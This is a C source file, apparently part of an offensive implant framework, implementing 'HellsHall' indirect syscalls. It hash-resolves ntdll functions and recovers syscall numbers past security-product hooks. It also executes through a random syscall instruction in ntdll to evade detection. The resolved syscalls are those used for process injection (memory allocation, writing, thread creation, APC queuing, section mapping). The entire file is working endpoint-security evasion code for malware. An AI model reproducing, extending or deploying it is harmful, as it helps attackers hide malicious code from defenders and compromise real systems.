// ─── HellsHall Indirect Syscalls ───
// PIC-safe implementation: no .data globals, all state in INSTANCE struct.
// CRC32B hashing, hooked-syscall recovery, random syscall instruction address.

#include "config.h"
#include "common.h"

#ifdef INCLUDE_EVASION_HELLSHALL
#include "evasion/hellshall.h"

// ─── Constants ───
#define SYSCALL_STUB_SIZE   0x20
#ifdef _WIN64
#define CLEAN_STUB_BYTE0    0x4C   // mov r10, rcx
#define CLEAN_STUB_BYTE1    0x8B
#define CLEAN_STUB_BYTE2    0xD1
#define CLEAN_STUB_BYTE3    0xB8   // mov eax, SSN
#define SSN_LOW_OFF         4
#define SSN_HIGH_OFF        5
#define ZERO_CHECK_OFF1     6
#define ZERO_CHECK_OFF2     7
#else
// x86 WOW64: B8 xx xx 00 00 (mov eax, SSN) - 5-byte stub header, 20-byte total
#undef  SYSCALL_STUB_SIZE
#define SYSCALL_STUB_SIZE   0x14
#define CLEAN_STUB_BYTE0    0xB8   // mov eax, SSN
#define SSN_LOW_OFF         1
#define SSN_HIGH_OFF        2
#define ZERO_CHECK_OFF1     3
#define ZERO_CHECK_OFF2     4
#endif
#define SEARCH_UP           (-1 * SYSCALL_STUB_SIZE)
#define SEARCH_DOWN         SYSCALL_STUB_SIZE
#define SEARCH_RANGE        0xFF

// ─── NTDLL export directory config (stack-allocated, not global) ───
typedef struct _NTDLL_CONFIG {
    PDWORD      pdwArrayOfAddresses;
    PDWORD      pdwArrayOfNames;
    PWORD       pwArrayOfOrdinals;
    DWORD       dwNumberOfNames;
    ULONG_PTR   uModule;
} NTDLL_CONFIG;

// ─── CRC32B hash (seed 0xFFFFEFFF, poly 0xEDB88320) ───
DWORD hh_crc32b(const char* str) {
    DWORD uHash = 0xFFFFEFFF;
    DWORD uMask = 0;
    int i = 0;

    while (str[i] != 0) {
        uHash = uHash ^ (DWORD)str[i];
        for (int ii = 0; ii < 8; ii++) {
            uMask = (DWORD)(-(INT)(uHash & 1));
            uHash = (uHash >> 1) ^ (0xEDB88320 & uMask);
        }
        i++;
    }
    return ~uHash;
}

// ─── Initialize NTDLL export config from PEB ───
static BOOL hh_init_ntdll_config(NTDLL_CONFIG* pConf, PVOID ntdll_base) {
    if (!ntdll_base)
        return FALSE;

    ULONG_PTR uModule = (ULONG_PTR)ntdll_base;

    PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)uModule;
    if (pDos->e_magic != 0x5A4D)
        return FALSE;

    PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)(uModule + pDos->e_lfanew);
    if (pNt->Signature != IMAGE_NT_SIGNATURE)
        return FALSE;

    DWORD expRva = pNt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
    if (!expRva)
        return FALSE;

    PIMAGE_EXPORT_DIRECTORY pExp = (PIMAGE_EXPORT_DIRECTORY)(uModule + expRva);

    pConf->uModule              = uModule;
    pConf->dwNumberOfNames      = pExp->NumberOfNames;
    pConf->pdwArrayOfNames      = (PDWORD)(uModule + pExp->AddressOfNames);
    pConf->pdwArrayOfAddresses  = (PDWORD)(uModule + pExp->AddressOfFunctions);
    pConf->pwArrayOfOrdinals    = (PWORD)(uModule + pExp->AddressOfNameOrdinals);

    if (!pConf->dwNumberOfNames || !pConf->pdwArrayOfNames ||
        !pConf->pdwArrayOfAddresses || !pConf->pwArrayOfOrdinals)
        return FALSE;

    return TRUE;
}

// ─── Fetch a single syscall by CRC32B hash ───
// Handles clean, JMP-hooked (offset 0), and JMP-hooked (offset 3) scenarios.
// Finds a random `syscall` instruction address in ntdll for indirect execution.
BOOL hellshall_fetch(PVOID ntdll_base, DWORD dwSysHash, PNT_SYSCALL pNtSys) {
    NTDLL_CONFIG conf;
    es_memset(&conf, 0, sizeof(conf));

    if (!hh_init_ntdll_config(&conf, ntdll_base))
        return FALSE;

    es_memset(pNtSys, 0, sizeof(NT_SYSCALL));

    for (DWORD i = 0; i < conf.dwNumberOfNames; i++) {
        PCHAR pcFuncName   = (PCHAR)(conf.uModule + conf.pdwArrayOfNames[i]);
        PVOID pFuncAddress = (PVOID)(conf.uModule + conf.pdwArrayOfAddresses[conf.pwArrayOfOrdinals[i]]);

        if (hh_crc32b(pcFuncName) != dwSysHash)
            continue;

        pNtSys->pSyscallAddress = pFuncAddress;

        // ─── Clean (unhooked) syscall stub ───
        // x64 pattern: 4C 8B D1  B8 xx xx 00 00  (mov r10, rcx; mov eax, SSN)
        // x86 pattern: B8 xx xx 00 00  (mov eax, SSN) - WOW64 and native x86
#ifdef _WIN64
        if (*((PBYTE)pFuncAddress)     == 0x4C &&
            *((PBYTE)pFuncAddress + 1) == 0x8B &&
            *((PBYTE)pFuncAddress + 2) == 0xD1 &&
            *((PBYTE)pFuncAddress + 3) == 0xB8 &&
            *((PBYTE)pFuncAddress + 6) == 0x00 &&
            *((PBYTE)pFuncAddress + 7) == 0x00) {

            BYTE high = *((PBYTE)pFuncAddress + 5);
            BYTE low  = *((PBYTE)pFuncAddress + 4);
            pNtSys->dwSSn = (high << 8) | low;
        }
#else
        if (*((PBYTE)pFuncAddress)     == 0xB8 &&
            *((PBYTE)pFuncAddress + 3) == 0x00 &&
            *((PBYTE)pFuncAddress + 4) == 0x00) {

            BYTE high = *((PBYTE)pFuncAddress + 2);
            BYTE low  = *((PBYTE)pFuncAddress + 1);
            pNtSys->dwSSn = (high << 8) | low;
        }
#endif
        // ─── Hooked scenario 1: JMP at offset 0 (E9 xx xx xx xx) ───
        else if (*((PBYTE)pFuncAddress) == 0xE9) {
            for (WORD idx = 1; idx <= SEARCH_RANGE; idx++) {
                // Search DOWN
                if (*((PBYTE)pFuncAddress + idx * SEARCH_DOWN)                    == CLEAN_STUB_BYTE0 &&
#ifdef _WIN64
                    *((PBYTE)pFuncAddress + 1 + idx * SEARCH_DOWN)                == CLEAN_STUB_BYTE1 &&
                    *((PBYTE)pFuncAddress + 2 + idx * SEARCH_DOWN)                == CLEAN_STUB_BYTE2 &&
                    *((PBYTE)pFuncAddress + 3 + idx * SEARCH_DOWN)                == CLEAN_STUB_BYTE3 &&
#endif
                    *((PBYTE)pFuncAddress + ZERO_CHECK_OFF1 + idx * SEARCH_DOWN)  == 0x00 &&
                    *((PBYTE)pFuncAddress + ZERO_CHECK_OFF2 + idx * SEARCH_DOWN)  == 0x00) {
                    BYTE high = *((PBYTE)pFuncAddress + SSN_HIGH_OFF + idx * SEARCH_DOWN);
                    BYTE low  = *((PBYTE)pFuncAddress + SSN_LOW_OFF  + idx * SEARCH_DOWN);
                    pNtSys->dwSSn = (DWORD)((high << 8) | low) - idx;
                    break;
                }
                // Search UP
                if (*((PBYTE)pFuncAddress + idx * SEARCH_UP)                      == CLEAN_STUB_BYTE0 &&
#ifdef _WIN64
                    *((PBYTE)pFuncAddress + 1 + idx * SEARCH_UP)                  == CLEAN_STUB_BYTE1 &&
                    *((PBYTE)pFuncAddress + 2 + idx * SEARCH_UP)                  == CLEAN_STUB_BYTE2 &&
                    *((PBYTE)pFuncAddress + 3 + idx * SEARCH_UP)                  == CLEAN_STUB_BYTE3 &&
#endif
                    *((PBYTE)pFuncAddress + ZERO_CHECK_OFF1 + idx * SEARCH_UP)    == 0x00 &&
                    *((PBYTE)pFuncAddress + ZERO_CHECK_OFF2 + idx * SEARCH_UP)    == 0x00) {
                    BYTE high = *((PBYTE)pFuncAddress + SSN_HIGH_OFF + idx * SEARCH_UP);
                    BYTE low  = *((PBYTE)pFuncAddress + SSN_LOW_OFF  + idx * SEARCH_UP);
                    pNtSys->dwSSn = (DWORD)((high << 8) | low) + idx;
                    break;
                }
            }
        }
        // ─── Hooked scenario 2: JMP at offset 3 (xx xx xx E9 ...) ───
        else if (*((PBYTE)pFuncAddress + 3) == 0xE9) {
            for (WORD idx = 1; idx <= SEARCH_RANGE; idx++) {
                if (*((PBYTE)pFuncAddress + idx * SEARCH_DOWN)                    == CLEAN_STUB_BYTE0 &&
#ifdef _WIN64
                    *((PBYTE)pFuncAddress + 1 + idx * SEARCH_DOWN)                == CLEAN_STUB_BYTE1 &&
                    *((PBYTE)pFuncAddress + 2 + idx * SEARCH_DOWN)                == CLEAN_STUB_BYTE2 &&
                    *((PBYTE)pFuncAddress + 3 + idx * SEARCH_DOWN)                == CLEAN_STUB_BYTE3 &&
#endif
                    *((PBYTE)pFuncAddress + ZERO_CHECK_OFF1 + idx * SEARCH_DOWN)  == 0x00 &&
                    *((PBYTE)pFuncAddress + ZERO_CHECK_OFF2 + idx * SEARCH_DOWN)  == 0x00) {
                    BYTE high = *((PBYTE)pFuncAddress + SSN_HIGH_OFF + idx * SEARCH_DOWN);
                    BYTE low  = *((PBYTE)pFuncAddress + SSN_LOW_OFF  + idx * SEARCH_DOWN);
                    pNtSys->dwSSn = (DWORD)((high << 8) | low) - idx;
                    break;
                }
                if (*((PBYTE)pFuncAddress + idx * SEARCH_UP)                      == CLEAN_STUB_BYTE0 &&
#ifdef _WIN64
                    *((PBYTE)pFuncAddress + 1 + idx * SEARCH_UP)                  == CLEAN_STUB_BYTE1 &&
                    *((PBYTE)pFuncAddress + 2 + idx * SEARCH_UP)                  == CLEAN_STUB_BYTE2 &&
                    *((PBYTE)pFuncAddress + 3 + idx * SEARCH_UP)                  == CLEAN_STUB_BYTE3 &&
#endif
                    *((PBYTE)pFuncAddress + ZERO_CHECK_OFF1 + idx * SEARCH_UP)    == 0x00 &&
                    *((PBYTE)pFuncAddress + ZERO_CHECK_OFF2 + idx * SEARCH_UP)    == 0x00) {
                    BYTE high = *((PBYTE)pFuncAddress + SSN_HIGH_OFF + idx * SEARCH_UP);
                    BYTE low  = *((PBYTE)pFuncAddress + SSN_LOW_OFF  + idx * SEARCH_UP);
                    pNtSys->dwSSn = (DWORD)((high << 8) | low) + idx;
                    break;
                }
            }
        }

        break; // Found our target function, stop iterating
    }

    if (!pNtSys->pSyscallAddress || !pNtSys->dwSSn)
        return FALSE;

    // ─── Find a random syscall/sysenter instruction in ntdll ───
    // x64: syscall = 0F 05; x86: sysenter = 0F 34 or int 0x2e = CD 2E
    LARGE_INTEGER tsc;
    tsc.QuadPart = __rdtsc();
    ULONG_PTR uBase = (ULONG_PTR)pNtSys->pSyscallAddress + (tsc.LowPart % 0xFF);

    for (DWORD z = 0, x = 1; z <= SEARCH_RANGE; z++, x++) {
#ifdef _WIN64
        if (*((PBYTE)uBase + z) == 0x0F && *((PBYTE)uBase + x) == 0x05) {
#else
        // sysenter (0F 34) or int 0x2e (CD 2E)
        if ((*((PBYTE)uBase + z) == 0x0F && *((PBYTE)uBase + x) == 0x34) ||
            (*((PBYTE)uBase + z) == 0xCD && *((PBYTE)uBase + x) == 0x2E)) {
#endif
            pNtSys->pSyscallInstAddress = (PVOID)((ULONG_PTR)uBase + z);
            return TRUE;
        }
    }

    return FALSE;
}

// ─── Resolve all needed syscalls at init ───
BOOL hellshall_init(PINSTANCE inst) {
    if (!inst->Modules.Ntdll)
        return FALSE;

    PVOID ntdll = inst->Modules.Ntdll;
    BOOL ok = TRUE;

    // Syscall name → index mapping. HH_CRC() resolves each name to a CRC32B
    // either from a build-time constant (static) or at runtime from an
    // XOR-obfuscated string (HH_HASH_DYNAMIC).
    struct { DWORD hash; DWORD idx; } syscall_table[] = {
        { HH_CRC(NtAllocateVirtualMemory),        HH_IDX_NtAllocateVirtualMemory },
        { HH_CRC(NtProtectVirtualMemory),         HH_IDX_NtProtectVirtualMemory },
        { HH_CRC(NtWriteVirtualMemory),           HH_IDX_NtWriteVirtualMemory },
        { HH_CRC(NtCreateThreadEx),               HH_IDX_NtCreateThreadEx },
        { HH_CRC(NtWaitForSingleObject),          HH_IDX_NtWaitForSingleObject },
        { HH_CRC(NtCreateSection),                HH_IDX_NtCreateSection },
        { HH_CRC(NtMapViewOfSection),             HH_IDX_NtMapViewOfSection },
        { HH_CRC(NtUnmapViewOfSection),           HH_IDX_NtUnmapViewOfSection },
        { HH_CRC(NtQueueApcThread),               HH_IDX_NtQueueApcThread },
        { HH_CRC(NtClose),                        HH_IDX_NtClose },
        { HH_CRC(NtCreateEvent),                  HH_IDX_NtCreateEvent },
        { HH_CRC(NtSignalAndWaitForSingleObject), HH_IDX_NtSignalAndWaitForSingleObject },
        { HH_CRC(NtContinue),                     HH_IDX_NtContinue },
        { HH_CRC(NtResumeThread),                 HH_IDX_NtResumeThread },
    };

    DWORD count = sizeof(syscall_table) / sizeof(syscall_table[0]);

    // Zero out the syscall array
    es_memset(inst->HH_Syscalls, 0, sizeof(NT_SYSCALL) * HH_MAX_SYSCALLS);

    for (DWORD i = 0; i < count; i++) {
        if (!hellshall_fetch(ntdll, syscall_table[i].hash,
                             &inst->HH_Syscalls[syscall_table[i].idx])) {
            DBG(inst, "[HH] Failed to resolve syscall");
            ok = FALSE;
            // Continue resolving remaining syscalls - partial init is useful
        }
    }

    inst->bHellsHallInit = ok;
    return ok;
}

#endif // INCLUDE_EVASION_HELLSHALL
